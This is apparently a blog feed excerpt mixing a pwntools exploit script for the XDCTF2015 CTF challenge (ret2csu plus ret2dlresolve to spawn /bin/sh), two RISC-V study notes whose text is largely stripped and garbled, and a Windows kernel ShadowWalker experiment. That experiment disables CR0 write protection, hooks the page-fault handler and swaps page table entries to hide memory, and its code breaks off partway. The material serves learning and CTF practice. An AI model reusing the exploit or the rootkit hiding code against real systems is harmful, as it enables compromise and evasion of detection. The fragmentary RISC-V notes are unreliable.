class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x40066C&#x27;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x00400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x0040079A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rel_plt))</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line">p(<span class="string">&#x27;dlresolve.data_addr&#x27;</span>,dlresolve.data_addr)</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">got_0=<span class="number">0x0601008</span></span><br><span class="line"><span class="comment">#linkmap</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(write_got,<span class="number">1</span>,got_0,<span class="number">8</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">link_map_addr =uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;link_map_addr&#x27;</span>,link_map_addr)</span><br><span class="line"><span class="comment">#linkmap-&gt;l_info[VERSYMIDX(DT_VERSYM)]linkmap0x1c80</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V ASM</title>
      <link href="/2023/07/09/risc-v-asm/"/>
      <url>/2023/07/09/risc-v-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-ASM"><a href="#RISC-V-ASM" class="headerlink" title="RISC-V ASM"></a>RISC-V ASM</h1><p>RV32Iasm</p><h2 id="operation"><a href="#operation" class="headerlink" title="operation"></a>operation</h2><p>instruction():</p><p>pseudo-instruction():(instruction)</p><p>direction(&#x2F;):(.).text.text,</p><p>macro .macro&#x2F;.endm </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/07/09/risc-v-asm/image-20230710232853854.png" alt="image-20230710232853854"></p><p><strong>funct3funct7opcode</strong>()</p><blockquote><p>funct3:functfunction 33bits</p></blockquote><ul><li>R-type:Register fields3</li><li>I-type: (Immediate 12 bits</li><li>S-type: Store 12 bits fields  I-type</li><li>B-type: (Branch) 12 bits 2 </li><li>U-type: Upper 20bits 20 </li><li>J-type: Jump 20bits</li></ul><blockquote><p>rd:rregister ddestination</p><p>rs:ssource</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD RD(5)RS1(5)RS2(5)    RD&#x3D;RS1+RS2</p><blockquote><p>55bit</p></blockquote><p>:R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721154322672.png" alt="image-20230721154322672"></p><ul><li>opcode:01 100 11</li><li>fuct3:000 funct7 0000000</li></ul><h3 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a>SUB</h3><p>SUB RD, RS1, RS2RD&#x3D;RS1-RS2</p><p>:R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721154425111.png" alt="image-20230721154425111"></p><ul><li>opcode:01 100 11</li><li>fuct3:000 funct7 0100000</li></ul><h3 id="ADDIADD-Immediate"><a href="#ADDIADD-Immediate" class="headerlink" title="ADDIADD Immediate"></a>ADDIADD Immediate</h3><p>ADDI RD, RS1, IMMRD&#x3D;RSI+IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721155114720.png" alt="image-20230721155114720"></p><p>-2<sup>11</sup><del>2<sup>11</sup>-1 (-2048</del>2047)32imm</p><h3 id="LUI-Loda-Upper-Immediate"><a href="#LUI-Loda-Upper-Immediate" class="headerlink" title="LUI(Loda Upper Immediate)"></a>LUI(Loda Upper Immediate)</h3><p>LUI RD,IMMRD&#x3D;IMM&lt;&lt;12</p><p>U-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721163824345.png" alt="image-20230721163824345"></p><p>ADDI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lui x1,0x12345</span><br><span class="line">addi x1,0x678 ;    x1=0x12345678</span><br></pre></td></tr></table></figure><p>121addi</p><p>x1&#x3D;0x12345fff</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lui x1,0x12346</span><br><span class="line">addi x1,-1</span><br></pre></td></tr></table></figure><h3 id="LI-Load-Immediate"><a href="#LI-Load-Immediate" class="headerlink" title="LI(Load Immediate)"></a>LI(Load Immediate)</h3><p>LI RD,IMMRD&#x3D;IMM</p><p><strong> 32luiaddi</strong></p><h3 id="AUIPC"><a href="#AUIPC" class="headerlink" title="AUIPC"></a>AUIPC</h3><p>AUIPC RD IMMRD&#x3D;IMM&lt;&lt;12+PC</p><p>U-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721171932394.png" alt="image-20230721171932394"></p><h3 id="LA-Load-Address"><a href="#LA-Load-Address" class="headerlink" title="LA(Load Address)"></a>LA(Load Address)</h3><p>LA RD,LABEL </p><p><strong> auipc</strong></p><h3 id="NEG"><a href="#NEG" class="headerlink" title="NEG"></a>NEG</h3><p>NEG RDRSRD&#x3D;-RS</p><p><strong> SUB RDx0RS</strong>(x0)</p><h3 id="MV"><a href="#MV" class="headerlink" title="MV"></a>MV</h3><p>MV RDRSRD&#x3D;RS</p><p><strong> ADDI RDRS0</strong></p><h3 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h3><p>nophh</p><p><strong> ADDI x0,x0,0</strong> </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND RD,RS1,RS2RD &#x3D; RS1 &amp; RS2</p><p>R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721173921186.png" alt="image-20230721173921186"></p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>OR RD,RS1,RS2RD &#x3D; RS1 | RS2</p><p>R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174008445.png" alt="image-20230721174008445"></p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>AND RD,RS1,RS2RD &#x3D; RS1 ^ RS2</p><p>R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174111167.png" alt="image-20230721174111167"></p><h3 id="ANDI"><a href="#ANDI" class="headerlink" title="ANDI"></a>ANDI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174041635.png" alt="image-20230721174041635"></p><h3 id="ORI"><a href="#ORI" class="headerlink" title="ORI"></a>ORI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174138698.png" alt="image-20230721174138698"></p><h3 id="XORI"><a href="#XORI" class="headerlink" title="XORI"></a>XORI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174152255.png" alt="image-20230721174152255"></p><h3 id="NOT"><a href="#NOT" class="headerlink" title="NOT"></a>NOT</h3><p>NOT RD,RS RD&#x3D;!RS </p><p><strong> XOR RDRS-1</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="gt-gt-gt-"><a href="#gt-gt-gt-" class="headerlink" title="&gt;&gt;&gt;"></a><strong>&gt;&gt;&gt;</strong></h3><h3 id="SLL-Shitf-Left-Logical"><a href="#SLL-Shitf-Left-Logical" class="headerlink" title="SLL(Shitf Left Logical)"></a>SLL(Shitf Left Logical)</h3><p>SLL RD,RS1,RS2RD&#x3D;RS1&lt;&lt;RS2</p><p>R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180716677.png" alt="image-20230721180716677"></p><h3 id="SRL-Shitf-Right-Logical"><a href="#SRL-Shitf-Right-Logical" class="headerlink" title="SRL(Shitf Right Logical)"></a>SRL(Shitf Right Logical)</h3><p>SRL RD,RS1,RS2RD&#x3D;RS1&gt;&gt;RS2</p><p>R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180838972.png" alt="image-20230721180838972"></p><h3 id="SLLI-Shitf-Right-Logical-Immediate"><a href="#SLLI-Shitf-Right-Logical-Immediate" class="headerlink" title="SLLI(Shitf Right Logical Immediate)"></a>SLLI(Shitf Right Logical Immediate)</h3><p>SLLI RD,RS1,IMMRD&#x3D;RS1&lt;&lt;IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180802935.png" alt="image-20230721180802935"></p><h3 id="SRLI-Shitf-Right-Logical-Immediate"><a href="#SRLI-Shitf-Right-Logical-Immediate" class="headerlink" title="SRLI(Shitf Right Logical Immediate)"></a>SRLI(Shitf Right Logical Immediate)</h3><p>SRLI RD,RS1,IMMRD&#x3D;RS1&gt;&gt;IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180904728.png" alt="image-20230721180904728"></p><h3 id="gt-gt-gt-"><a href="#gt-gt-gt-" class="headerlink" title="&gt;&gt;&gt;"></a><strong>&gt;&gt;&gt;</strong></h3><h3 id="SRA-Shitf-Right-Arithmetic"><a href="#SRA-Shitf-Right-Arithmetic" class="headerlink" title="SRA(Shitf Right Arithmetic)"></a>SRA(Shitf Right Arithmetic)</h3><p>SRA RD,RS1,RS2RD&#x3D;RS1&gt;&gt;RS2</p><p>R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721181748545.png" alt="image-20230721181748545"></p><h3 id="SRAI"><a href="#SRAI" class="headerlink" title="SRAI"></a>SRAI</h3><p>SRA RD,RS1,IMMRD&#x3D;RS1&gt;&gt;IMM</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721181807571.png" alt="image-20230721181807571"></p><blockquote><p><strong>shamt(shift amount)bit2^5  1&#x3D;31RV32</strong></p></blockquote><h2 id="load-store"><a href="#load-store" class="headerlink" title="load store"></a>load store</h2><h3 id="LB-Load-Byte"><a href="#LB-Load-Byte" class="headerlink" title="LB(Load Byte)"></a>LB(Load Byte)</h3><p>LB RD,IMM(RS1)*(Byte*)(RD) &#x3D; *(Byte*)(RS1+IMM) </p><h3 id="LH-Load-Halfword"><a href="#LH-Load-Halfword" class="headerlink" title="LH(Load Halfword)"></a>LH(Load Halfword)</h3><p>LH RD,IMM(RS1)*(Halfword*)(RD) &#x3D; *(Halfword*)(RS1+IMM) </p><h3 id="LW-Load-Word"><a href="#LW-Load-Word" class="headerlink" title="LW(Load Word)"></a>LW(Load Word)</h3><p>LW RD,IMM(RS1)*(Word*)(RD) &#x3D; *(Wword*)(RS1+IMM) </p><h3 id="LBU-Load-Byte-Unsigned"><a href="#LBU-Load-Byte-Unsigned" class="headerlink" title="LBU(Load Byte Unsigned)"></a>LBU(Load Byte Unsigned)</h3><p>LBU RD,IMM(RS1)*(Byte*)(RD) &#x3D; *(Byte*)(RS1+IMM) </p><h3 id="LHU-Load-HalfWord-Unsigned"><a href="#LHU-Load-HalfWord-Unsigned" class="headerlink" title="LHU(Load HalfWord Unsigned)"></a>LHU(Load HalfWord Unsigned)</h3><p>LHU RD,IMM(RS1)*(Halfword*)(RD) &#x3D; *(Halfword*)(RS1+IMM) </p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721182935536.png" alt="image-20230721182935536"></p><h3 id="SB-Store-Byte"><a href="#SB-Store-Byte" class="headerlink" title="SB(Store Byte)"></a>SB(Store Byte)</h3><p>SB RS2,IMM(RS1)*(Byte*)(RS1+IMM)&#x3D;RS2[0:7]</p><h3 id="SH-Stroe-Halfword"><a href="#SH-Stroe-Halfword" class="headerlink" title="SH(Stroe Halfword)"></a>SH(Stroe Halfword)</h3><p>SB RS2,IMM(RS1)*(Halfword*)(RS1+IMM)&#x3D;RS2[0:15]</p><h3 id="SW-Store-Word"><a href="#SW-Store-Word" class="headerlink" title="SW(Store Word)"></a>SW(Store Word)</h3><p>SB RS2,IMM(RS1)*(Word*)(RS1+IMM)&#x3D;RS2</p><p>S-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721185513346.png" alt="image-20230721185513346"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/07/09/risc-v-asm/image-20230721190529161.png" alt="image-20230721190529161"></p><p><strong> IMM x 2 PC  PC +&#x2F;- 4KB  ([-4096, 4094])</strong></p><blockquote><p><img src="/2023/07/09/risc-v-asm/image-20230721192040448.png" alt="image-20230721192040448"></p><p>b-type000-4096, 4094 2*(-2^(11),2^(11)-1)</p></blockquote><p><img src="/2023/07/09/risc-v-asm/image-20230721194722440.png" alt="image-20230721194722440"></p><h3 id="JAL-Jump-And-Link"><a href="#JAL-Jump-And-Link" class="headerlink" title="JAL(Jump And Link)"></a>JAL(Jump And Link)</h3><p>JAL RD,LABEL</p><p>J-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721213626062.png" alt="image-20230721213626062"></p><p>20<em>2pcRD2*(-2^(19),2^(19)-1)(-10485761048574)</em><em>+&#x2F;-1M</em>*</p><h3 id="JALR-Jump-And-Link-Register"><a href="#JALR-Jump-And-Link-Register" class="headerlink" title="JALR(Jump And Link Register)"></a>JALR(Jump And Link Register)</h3><p>JALR RD,IMM(RS1)</p><p>I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721214742447.png" alt="image-20230721214742447"></p><p>12bitIMMRS11bit0()RS1-2^11,2^11-1**+&#x2F;-2k**</p><blockquote><p>1M</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auipc x6,IMM </span><br><span class="line">jalr x1,x6,IMM</span><br></pre></td></tr></table></figure></blockquote><h3 id="J"><a href="#J" class="headerlink" title="J"></a>J</h3><p>J offset x86jmp</p><p><strong> JAL x0offset</strong></p><h3 id="JR"><a href="#JR" class="headerlink" title="JR"></a>JR</h3><p>JR RS</p><p><strong> JALR x00(RS)</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/07/09/risc-v-asm/image-20230721235450399.png" alt="image-20230721235450399"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="/2023/07/09/risc-v-asm/image-20230722001809195.png" alt="image-20230722001809195"></p><p>TODO: emm32riscv64</p>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V ISA</title>
      <link href="/2023/07/08/ISA-risc-v/"/>
      <url>/2023/07/08/ISA-risc-v/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-ISA"><a href="#RISC-V-ISA" class="headerlink" title="RISC-V ISA"></a>RISC-V ISA</h1><p>(armISA)</p><h2 id="ISA-Instruction-Set-Architecture-"><a href="#ISA-Instruction-Set-Architecture-" class="headerlink" title="ISA(Instruction Set Architecture)"></a>ISA(Instruction Set Architecture)</h2><p><strong></strong></p><blockquote><p>ISA <a href="https://zh.wikipedia.org/zh-cn/%E5%BE%AE%E6%9E%B6%E6%A7%8B"></a>microarchitectureISA</p></blockquote><p>cPOSIXcpux86intelamd</p><blockquote><p>amd64</p><p>intel64(IA-64)32amd64amd6432intelamd64(amd64<del></del>)intel,x86-64</p></blockquote><p>ISA</p><ul><li></li><li></li><li></li><li></li><li></li><li></li></ul><blockquote><p><del>ISA</del>ISA</p></blockquote><h2 id="RISC-V-ISA-"><a href="#RISC-V-ISA-" class="headerlink" title="RISC-V ISA "></a>RISC-V ISA </h2><p><strong>RV[###][abc..xyz]</strong></p><ul><li>RV RISC-V  RISC-V</li><li>[###]{32, 64, 128} bit</li><li>[abcxyz]</li></ul><h2 id="ISA"><a href="#ISA" class="headerlink" title="ISA"></a>ISA</h2><p>1 + </p><p><del>WC</del></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>RV32I</td><td>32</td></tr><tr><td>RV32E</td><td>RV32I </td></tr><tr><td>RV64I</td><td>64  RV32I</td></tr><tr><td>RV128I</td><td>128  RV64IRV32I</td></tr></tbody></table><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>M</td><td></td></tr><tr><td>A</td><td></td></tr><tr><td>F</td><td></td></tr><tr><td>D</td><td></td></tr><tr><td>C</td><td></td></tr><tr><td>Z</td><td>(CSR)</td></tr><tr><td>P</td><td></td></tr><tr><td>B</td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p><strong>IMAFD</strong>(General)G</p><h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p><img src="/2023/07/08/ISA-risc-v/image-20230626115944963.png" alt="image-20230626115944963"></p><p>RV32E  32  16 </p><h2 id="Hart"><a href="#Hart" class="headerlink" title="Hart"></a>Hart</h2><p>HART &#x3D; HARdware Thread</p><p>intel()HART</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/07/08/ISA-risc-v/image-20230626122607114.png" alt="image-20230626122607114"></p><p>level3 machine</p><p>linuxriscv cpuUser(00),cpuSupervisor(01)</p><p>Machinex86Machine</p><h2 id="Control-and-Status-Registers-CSR"><a href="#Control-and-Status-Registers-CSR" class="headerlink" title="Control and Status Registers(CSR)"></a>Control and Status Registers(CSR)</h2><p>CSR</p><p>CSR</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:ShadowWalker</title>
      <link href="/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/"/>
      <url>/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-ShadowWalker"><a href="#Windows-ShadowWalker" class="headerlink" title="Windows:ShadowWalker"></a>Windows:ShadowWalker</h1><p>inlinehook</p><p>hooktlbfake</p><p>0</p><p>inlinehook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_PTE (DWORD64 *)0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PTE (DWORD64 *)0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f260</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span>*)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//size_t i=0;edi</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        <span class="comment">//_KiTrap0E hook</span></span><br><span class="line">        <span class="comment">//push 0x8003f130  68 30 F1 03 80</span></span><br><span class="line">        <span class="comment">//ret  C3</span></span><br><span class="line">        mov al,<span class="number">0x68</span></span><br><span class="line">        mov ds:[<span class="number">0x80541450</span>],al</span><br><span class="line">        mov dword ptr ds:[<span class="number">0x80541451</span>],<span class="number">0x8003f130</span></span><br><span class="line">        mov al, <span class="number">0xc3</span></span><br><span class="line">        mov ds:[<span class="number">0x80541455</span>],al</span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0xffffffff</span></span><br><span class="line">        mov ds:[T_CR3],eax</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        cmp eax, ds: [T_CR3]</span><br><span class="line">        jnz PASS</span><br><span class="line"></span><br><span class="line">        mov eax, cr2</span><br><span class="line">        shr eax, <span class="number">0xc</span></span><br><span class="line">        cmp eax, <span class="number">0x412</span></span><br><span class="line">        jnz PASS</span><br><span class="line">        <span class="comment">//+20pushad</span></span><br><span class="line">        mov eax, ss: [esp + <span class="number">0x20</span>]</span><br><span class="line">        test eax, <span class="number">0x10</span></span><br><span class="line">        jne EXECUTE</span><br><span class="line">        jmp READWRITE</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    EXECUTE:</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>)=*REAL_PTE;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//tlb</span></span><br><span class="line">        mov eax, <span class="number">0x412004</span></span><br><span class="line">        call eax</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = <span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">//iret</span></span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        iretd</span><br><span class="line">    READWRITE :</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = *FAKE_PTE;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//tlb</span></span><br><span class="line">        mov eax,ds:[<span class="number">0x41c000</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = <span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">//iret</span></span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        iretd</span><br><span class="line"> PASS:<span class="comment">//_KiTrap0E</span></span><br><span class="line">        popad</span><br><span class="line">        mov word ptr[esp + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">        push <span class="number">0x80541457</span></span><br><span class="line">        ret </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_PTE (DWORD64 *)0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PTE (DWORD64 *)0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f260</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;fake_data&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;fake_data&quot;</span>)) DWORD fake_page[<span class="number">1024</span>];<span class="comment">//0x41c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    *REAL_PTE = *PTE(<span class="number">0x412000</span>);</span><br><span class="line">    *FAKE_PTE = *PTE(<span class="number">0x41c000</span>);</span><br><span class="line">    <span class="comment">//,,,hook</span></span><br><span class="line">    *PTE(<span class="number">0x412000</span>)=<span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[T_CR3],eax<span class="comment">//inlinhookKiTrap0E,jnz end</span></span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    fake_page[<span class="number">0</span>] = <span class="number">0x12345678</span>;<span 